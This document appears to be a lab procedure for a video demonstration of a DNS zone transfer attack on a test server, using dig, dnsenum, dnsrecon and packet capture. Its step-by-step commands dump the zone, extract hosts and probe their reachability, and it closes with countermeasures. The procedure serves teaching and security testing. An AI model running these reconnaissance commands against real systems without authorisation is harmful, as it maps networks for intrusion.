# DNS Zone Transfer Attack Procedure

## Overview

DNS Zone Transfer (AXFR) is a protocol feature that allows a DNS server to replicate its entire zone database to another DNS server. When improperly configured, it can be exploited by attackers to obtain a complete list of all hosts in a domain, providing valuable reconnaissance information.

## Tools Required

1. `dig` - DNS lookup utility
2. `dnsenum` - DNS enumeration tool
3. `dnsrecon` - DNS reconnaissance tool
4. Wireshark or tcpdump - For packet capture and analysis

## Procedure

### 1. Initial Reconnaissance

1. First, verify that the target DNS server is responding:

   ```bash
   ping -c 3 192.168.2.10
   ```

2. Identify the name servers for the target domain:

   ```bash
   dig NS example.com @192.168.2.10
   ```

3. Attempt a standard DNS query to establish baseline communication:
   ```bash
   dig A www.example.com @192.168.2.10
   ```

### 2. Testing for Zone Transfer Vulnerability

1. Start packet capture on the attacker machine:

   ```bash
   tcpdump -i eth0 -n port 53 -w zone_transfer.pcap
   ```

2. Test for zone transfer using `dig`:

   ```bash
   dig AXFR example.com @192.168.2.10
   ```

3. Analyze the results:
   - If successful, this will return all DNS records for the domain
   - Look for A, MX, CNAME, TXT, and other record types
   - Note any sensitive hosts or patterns in naming conventions

### 3. Advanced Enumeration with Specialized Tools

1. Using `dnsenum`:

   ```bash
   dnsenum --enum -p 10 -s 10 -o zone_transfer_results.xml --noreverse example.com -s 192.168.2.10
   ```

2. Using `dnsrecon`:

   ```bash
   dnsrecon -d example.com -t axfr -n 192.168.2.10
   ```

3. Compare the results from different tools to ensure comprehensive enumeration

### 4. Analyzing Zone Transfer Data

1. Stop the packet capture:

   ```bash
   # Press Ctrl+C in the tcpdump terminal
   ```

2. Analyze the packet capture to understand the zone transfer protocol:
   ```bash
   wireshark zone_transfer.pcap
   ```
3. Extract key information from the results:

   ```bash
   # Create a list of all A records (IP addresses)
   dig AXFR example.com @192.168.2.10 | grep -E "IN\s+A" | awk '{print $1, $4, $5}'

   # Extract all mail servers
   dig AXFR example.com @192.168.2.10 | grep -E "IN\s+MX" | awk '{print $1, $4, $5, $6}'
   ```

4. Document discovered hosts and services for the attack demonstration:
   ```bash
   echo "Discovered hosts in example.com domain:" > discovered_hosts.txt
   dig AXFR example.com @192.168.2.10 | grep -E "IN\s+A" | awk '{print $1, $5}' >> discovered_hosts.txt
   cat discovered_hosts.txt
   ```

### 5. Demonstrating the Impact

1. Show how the information could be used for further attacks:

   ```bash
   # Ping each discovered host to verify reachability
   for host in $(cat discovered_hosts.txt | awk '{print $2}'); do
     echo "Checking host: $host"
     ping -c 1 $host
   done
   ```

2. Map the network structure based on the DNS information:

   ```bash
   # Create a simple visualization (textual)
   echo "DNS Zone Map for example.com:" > zone_map.txt
   echo "------------------------" >> zone_map.txt
   dig AXFR example.com @192.168.2.10 | grep -v "^;" | sort >> zone_map.txt
   cat zone_map.txt
   ```

3. Show potential targeted attacks based on discovered hosts:
   - Identify admin interfaces or internal systems
   - Note patterns in naming conventions
   - Highlight sensitive systems exposed by the zone transfer

### 6. Evidence Collection

1. Save all outputs for the video demonstration:

   ```bash
   # Create a directory for evidence
   mkdir -p zone_transfer_evidence

   # Save all outputs
   dig AXFR example.com @192.168.2.10 > zone_transfer_evidence/full_zone_transfer.txt
   cp zone_transfer.pcap zone_transfer_evidence/
   cp discovered_hosts.txt zone_transfer_evidence/
   cp zone_map.txt zone_transfer_evidence/
   ```

## Explanation for Video

When documenting this attack for the video:

1. Explain the DNS Zone Transfer mechanism and its legitimate uses
2. Describe the security issue with improper configuration
3. Show the BIND configuration that enabled the vulnerability
4. Demonstrate each step of the attack with command outputs
5. Analyze the protocol using packet captures
6. Explain the potential impact of the information disclosure
7. Discuss countermeasures (restricting zone transfers, TSIG authentication)

This demonstrates a complete reconnaissance attack that could lead to further network penetration.
